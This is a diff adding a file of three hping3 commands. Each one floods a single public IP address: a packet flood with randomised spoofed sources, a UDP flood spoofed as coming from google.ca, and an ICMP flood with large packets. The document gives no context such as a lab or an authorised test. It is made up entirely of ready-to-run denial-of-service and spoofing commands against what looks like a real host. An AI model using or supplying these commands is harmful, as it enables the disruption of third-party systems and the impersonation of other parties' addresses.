@@ -1,0 +1,3 @@
+1) hping3 -c 10000 --rand-source 138.197.132.34
+2) hping3 -c 9000 --udp --faster --spoof google.ca 138.197.132.34
+3) hping3 -c 11000 --icmp -d 1024 -i 75 138.197.132.34
